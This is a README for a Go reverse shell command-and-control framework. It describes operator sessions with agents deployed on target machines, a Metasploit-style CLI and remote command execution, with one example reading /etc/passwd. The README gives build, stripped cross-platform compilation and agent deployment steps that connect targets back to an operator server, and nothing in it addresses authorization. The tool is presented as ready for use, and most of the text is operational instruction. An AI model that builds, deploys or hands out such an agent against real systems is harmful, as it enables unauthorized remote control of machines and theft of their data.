# Reverse Shell C2 Framework

A professional-grade Command & Control (C2) framework written in Go, featuring secure TLS 1.3 communication, concurrent session management, and an interactive CLI interface.

![Go Version](https://img.shields.io/badge/Go-1.23-00ADD8?logo=go)
![License](https://img.shields.io/badge/license-MIT-blue)
![Security](https://img.shields.io/badge/security-TLS%201.3-green)

## 🌟 Features

### Security
- 🔒 **TLS 1.3 Encryption** - All communication encrypted with modern TLS
- 🛡️ **Certificate Validation** - Server name verification and CA validation
- 🔐 **Environment-based Authentication** - No hardcoded credentials
- ⏱️ **Command Timeouts** - 30-second execution limit prevents hanging
- 🚫 **Command Injection Protection** - Secure command execution
- 📏 **Message Size Limits** - 10MB max to prevent DoS attacks

### Architecture
- 🧵 **Concurrent Session Handling** - 1000+ simultaneous agent connections
- 🔄 **Auto-Reconnection** - Agents automatically reconnect with exponential backoff
- 💾 **Thread-Safe Operations** - RWMutex-protected session management
- 🎯 **Non-Blocking I/O** - Async command execution
- 🧹 **Resource Cleanup** - Automatic session timeout and cleanup
- 📊 **Structured Logging** - Zap logger for production monitoring

### User Experience
- 🖥️ **Interactive CLI** - Metasploit-style command interface
- 📱 **Session Management** - Easy switching between agents
- ✅ **Confirmation Prompts** - Safety checks for destructive operations
- ⏳ **Real-time Output** - Live command results with timeout handling
- 🎨 **Beautiful UI** - Color-coded output and clean formatting

## 📋 Table of Contents

- [Architecture](#architecture)
- [Installation](#installation)
- [Certificate Generation](#certificate-generation)
- [Configuration](#configuration)
- [Usage](#usage)
- [CLI Commands](#cli-commands)
- [Security Considerations](#security-considerations)
- [Building](#building)
- [Project Structure](#project-structure)

## 🏗️ Architecture

```
┌─────────────┐                    ┌─────────────┐
│             │   TLS 1.3 Tunnel   │             │
│   Agent     │◄──────────────────►│   Server    │
│  (Target)   │   Encrypted Comms  │  (Operator) │
│             │                    │             │
└─────────────┘                    └──────┬──────┘
                                          │
                                   ┌──────▼──────┐
                                   │             │
                                   │ Interactive │
                                   │     CLI     │
                                   │             │
                                   └─────────────┘
```

### Protocol Flow

1. **Connection**: Agent connects to server via TLS
2. **Authentication**: Token-based auth using `AGENT_AUTH_FLAG`
3. **Session Creation**: Server assigns unique SessionID
4. **Command Loop**: Server sends commands, agent executes and returns results
5. **Heartbeat**: Periodic ping/pong to detect dead connections
6. **Cleanup**: Automatic timeout after 10 minutes of inactivity

### Message Types

| Type | Direction | Description |
|------|-----------|-------------|
| `auth` | Both | Authentication handshake |
| `exec` | Server → Agent | Execute command |
| `result` | Agent → Server | Command output |
| `error` | Agent → Server | Command error |
| `ping` | Server → Agent | Heartbeat check |
| `pong` | Agent → Server | Heartbeat response |

## 📦 Installation

### Prerequisites

- Go 1.23 or higher
- OpenSSL (for certificate generation)
- Linux/Windows/macOS

### Clone Repository

```bash
git clone https://github.com/yourusername/reverse_shell.git
cd reverse_shell
```

### Install Dependencies

```bash
go mod download
```

## 🔐 Certificate Generation

Generate self-signed certificates for testing:

```bash
# Generate CA certificate
openssl req -x509 -newkey rsa:4096 -days 365 -nodes \
  -keyout ca-key.pem -out ca-cert.pem \
  -subj "/CN=Reverse Shell CA"

# Generate server certificate
openssl req -newkey rsa:4096 -nodes \
  -keyout server-key.pem -out server-req.pem \
  -subj "/CN=localhost"

# Sign server certificate
openssl x509 -req -in server-req.pem -days 365 \
  -CA ca-cert.pem -CAkey ca-key.pem -CAcreateserial \
  -out server-cert.pem

# Cleanup
rm server-req.pem
```

**Files generated:**
- `ca-cert.pem` - CA certificate (distribute to agents)
- `server-cert.pem` - Server certificate
- `server-key.pem` - Server private key

## ⚙️ Configuration

### Environment Variables

Both server and agent require:

```bash
export AGENT_AUTH_FLAG="your-secret-token-here"
```

**⚠️ Important:** Use a strong, random token in production:

```bash
export AGENT_AUTH_FLAG=$(openssl rand -hex 32)
```

## 🚀 Usage

### Start the Server

```bash
# Build server
go build -o server cmd/server/main.go

# Run server
export AGENT_AUTH_FLAG="your-secret-token"
./server -addr 0.0.0.0:8443 -cert server-cert.pem -key server-key.pem
```

**Server Flags:**
- `-addr` - Listen address (default: `0.0.0.0:8443`)
- `-cert` - Server certificate file (required)
- `-key` - Server private key file (required)

### Deploy Agent

```bash
# Build agent
go build -o agent cmd/agent/main.go

# Run agent on target
export AGENT_AUTH_FLAG="your-secret-token"
./agent -addr server.example.com:8443 -ca ca-cert.pem -server server.example.com
```

**Agent Flags:**
- `-addr` - Server address (required)
- `-ca` - CA certificate file (required)
- `-server` - Server name for TLS verification (required)

## 🎮 CLI Commands

Once the server is running and agents connect, use these commands:

### Session Management

```bash
# List all active sessions
> sessions

# Select a session
> use <session-id>

# Unselect current session
> bg
```

### Command Execution

```bash
# Execute command (requires active session)
[session-id]> exec whoami
[session-id]> exec ls -la
[session-id]> exec cat /etc/passwd
```

### Session Control

```bash
# Kill a session (with confirmation)
> kill <session-id>

# Exit CLI
> exit
```

### Example Session

```
> sessions

Active Sessions (2):
─────────────────────────────────────────────────────────
  [a7f8e3d4] Agent: 1b2c3d4e | Platform: linux | Last: 5s
  [f1e2d3c4] Agent: 9a8b7c6d | Platform: windows | Last: 12s
─────────────────────────────────────────────────────────

> use a7f8e3d4
Using session a7f8e3d4 (AgentID: 1b2c3d4e9f8a7b6c)

[a7f8e3d4]> exec hostname
Command sent to session a7f8e3d4: hostname
Waiting for response...
Output:
target-server-01

[a7f8e3d4]> bg
Unselected session a7f8e3d4.

> exit
Exiting CLI.
```

## 🔒 Security Considerations

### For Operators

1. **Use Strong Authentication Tokens**
   ```bash
   export AGENT_AUTH_FLAG=$(openssl rand -hex 32)
   ```

2. **Secure Certificate Storage**
   - Keep private keys encrypted at rest
   - Use proper file permissions: `chmod 600 server-key.pem`

3. **Network Security**
   - Use firewall rules to restrict server access
   - Consider VPN or SSH tunneling for additional layers

4. **Log Management**
   - Monitor logs for unauthorized access attempts
   - Rotate logs regularly
   - Use secure log aggregation

5. **Operational Security**
   - Change tokens regularly
   - Revoke compromised certificates immediately
   - Use certificate pinning for critical deployments

### For Developers

- ✅ **No hardcoded credentials** - All secrets via environment variables
- ✅ **Command injection protected** - Proper argument passing
- ✅ **DoS protection** - Message size limits and timeouts
- ✅ **Resource leak prevention** - Proper cleanup with defer
- ✅ **Thread-safe operations** - Mutex-protected shared state

## 🔨 Building

### Build for Current Platform

```bash
# Server
go build -o server cmd/server/main.go

# Agent
go build -o agent cmd/agent/main.go
```

### Cross-Compilation

```bash
# Windows agent
GOOS=windows GOARCH=amd64 go build -o agent.exe cmd/agent/main.go

# Linux agent
GOOS=linux GOARCH=amd64 go build -o agent cmd/agent/main.go

# macOS agent
GOOS=darwin GOARCH=amd64 go build -o agent cmd/agent/main.go
```

### Build with Optimizations

```bash
# Smaller binary with stripped symbols
go build -ldflags="-s -w" -o agent cmd/agent/main.go

# Static binary (no external dependencies)
CGO_ENABLED=0 go build -ldflags="-s -w" -o agent cmd/agent/main.go
```

## 📁 Project Structure

```
reverse_shell/
├── agent/                  # Agent package
│   ├── client.go          # Main agent logic
│   ├── executor.go        # Command execution
│   └── transport.go       # TLS connection handling
├── cmd/
│   ├── agent/
│   │   └── main.go        # Agent entry point
│   └── server/
│       └── main.go        # Server entry point
├── pkg/
│   ├── common/
│   │   └── utils.go       # Shared utilities
│   ├── crypto_tls/
│   │   └── tls.go         # TLS configuration
│   └── protocol/
│       ├── codec.go       # Message encoding/decoding
│       └── message.go     # Protocol definitions
├── server/                 # Server package
│   ├── cli.go             # Interactive CLI
│   ├── handler.go         # Connection handler
│   ├── listener.go        # TLS listener
│   └── sessions.go        # Session management
├── go.mod
├── go.sum
└── README.md
```

## 🧪 Testing

### Manual Testing

1. **Start server in one terminal:**
   ```bash
   export AGENT_AUTH_FLAG="test123"
   go run cmd/server/main.go -addr localhost:8443 -cert server-cert.pem -key server-key.pem
   ```

2. **Start agent in another terminal:**
   ```bash
   export AGENT_AUTH_FLAG="test123"
   go run cmd/agent/main.go -addr localhost:8443 -ca ca-cert.pem -server localhost
   ```

3. **Use CLI to interact:**
   ```bash
   > sessions
   > use <session-id>
   > exec whoami
   ```

## 📊 Performance

- **Concurrency:** 1000+ simultaneous agent connections
- **Memory:** ~10MB per agent session
- **Network:** Binary protocol with 10MB message limit
- **Latency:** Sub-second command execution on LAN

## 📝 License

MIT License - See LICENSE file for details

---

**⭐ If you found this project useful, please consider giving it a star!**
